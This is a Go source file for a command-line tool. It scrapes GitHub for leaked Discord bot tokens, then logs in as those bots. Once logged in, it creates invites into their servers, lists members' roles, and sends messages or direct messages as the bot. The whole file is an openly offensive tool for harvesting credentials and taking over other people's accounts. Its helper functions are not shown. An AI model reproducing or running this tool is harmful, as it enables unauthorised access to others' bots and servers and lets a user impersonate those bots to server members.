package main

import (
	"log"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/bwmarrin/discordgo"
)

// APIEndpoint : GitHub Search Code API Endpoint
const APIEndpoint string = "https://api.github.com"

func main() {
	shell := ishell.New()
	shell.Println("Discord BOT - CLI")

	var discord *discordgo.Session
	var err error

	//tokens
	shell.AddCmd(&ishell.Cmd{
		Name: "tokens",
		Help: "look for bot tokens on github [usage: tokens {page}]",
		Func: func(c *ishell.Context) {
			page := strings.Join(c.Args, " ")

			config := LoadConfig("config.json")

			repositories := GetRepositories(page, config.GitHubToken)
			codeList := DownloadCode(repositories)
			tokens := AnalyseCode(codeList)

			if len(tokens) > 0 {
				log.Println("Potential tokens on page " + page + " : ")
				for i := range tokens {
					log.Println(tokens[i])
				}
			} else {
				log.Println("No tokens were found on page " + page + ".")
			}
		},
	})

	//connect
	shell.AddCmd(&ishell.Cmd{
		Name: "connect",
		Help: "connect to a bot using token [usage: login {token}]",
		Func: func(c *ishell.Context) {
			token := strings.Join(c.Args, " ")
			discord, err = discordgo.New("Bot " + token)
			if err != nil {
				log.Fatal(err)
				return
			}
			discord.AddHandler(Ready)
			err = discord.Open()
			if err != nil {
				log.Println("Error opening Discord session: ", err)
			}
		},
	})

	//invite
	shell.AddCmd(&ishell.Cmd{
		Name: "invite",
		Help: "creates an invite to the server [usage: invite]",
		Func: func(c *ishell.Context) {
			if discord == nil {
				log.Println("Please connect before!")
				return
			}
			channel := FindFirstChannel(discord)
			if channel == nil {
				log.Println("No channel found, attempting to create one")
				channel, err := CreateChannel(discord, FindFirstGuild(discord).ID, "general", "text")
				if err != nil {
					log.Println("Couldn't create channel.")
					return
				}
				log.Println("Channel created. Proceeding to invitation...")
				invite, err := CreateInvite(discord, channel)
				if err != nil {
					log.Println(err)
					return
				}
				log.Println("Invite URL: " + invite)
				return
			}
			invite, err := CreateInvite(discord, channel)
			if err != nil {
				log.Println(err)
				return
			}
			log.Println("Invite URL: " + invite)
		},
	})

	//roles
	shell.AddCmd(&ishell.Cmd{
		Name: "roles",
		Help: "shows roles of user [usage: roles -u {username} -d {userDiscriminator}]",
		Func: func(c *ishell.Context) {
			if discord == nil {
				log.Println("Please connect before!")
				return
			}
			var user *discordgo.Member
			if c.Args != nil {
				if c.Args[0] == "-u" {
					username := c.Args[1]
					user = FindUserByUsername(discord, username)
				} else if c.Args[0] == "-d" {
					discriminator := c.Args[1]
					user = FindUserByDiscriminator(discord, discriminator)
				}
			} else {
				//Use BOT user
				user = FindUserByDiscriminator(discord, discord.State.User.Discriminator)
			}

			if user == nil {
				log.Println("No user found.")
			} else {
				var roleNames []string
				for i := range user.Roles {
					guild := FindFirstGuild(discord)
					role, _ := discord.State.Role(guild.ID, user.Roles[i])
					roleNames = append(roleNames, role.Name)
				}
				if len(roleNames) > 0 {
					log.Println("List of " + user.User.Username + "'s roles: ")
					for _, role := range roleNames {
						log.Println(role)
					}
				} else {
					log.Println(user.User.Username + " has no roles.")
				}
			}

		},
	})

	//message
	shell.AddCmd(&ishell.Cmd{
		Name: "message",
		Help: "send message to channel or user [usage: message -u username -d userDiscriminator -cid channelId -c channelName \"message\"",
		Func: func(c *ishell.Context) {
			if discord == nil {
				log.Println("Please connect before!")
				return
			}
			var user *discordgo.Member
			var channel *discordgo.Channel
			var message string
			if c.Args != nil && len(c.Args) >= 3 {
				if c.Args[0] == "-u" {
					username := c.Args[1]
					user = FindUserByUsername(discord, username)
				} else if c.Args[0] == "-d" {
					discriminator := c.Args[1]
					user = FindUserByDiscriminator(discord, discriminator)
				} else if c.Args[0] == "-cid" {
					id := c.Args[1]
					channel = FindChannelByID(discord, id)
				} else if c.Args[0] == "-c" {
					name := c.Args[1]
					channel = FindChannelByName(discord, name)
				} else {
					log.Println("Please specify either a user (username or discriminator) or a channel (id or name) and a message")
					return
				}
				message = c.Args[2]
			} else {
				log.Println("Please specify either a user (username or discriminator) or a channel (id or name) and a message")
				return
			}

			if user != nil {
				directMessageChannel, err := discord.UserChannelCreate(user.User.ID)
				if err != nil {
					log.Println(err)
					return
				}
				discord.ChannelMessageSend(directMessageChannel.ID, message)
				return
			}
			if channel != nil {
				discord.ChannelMessageSend(channel.ID, message)
			}
		},
	})

	shell.Run()
}
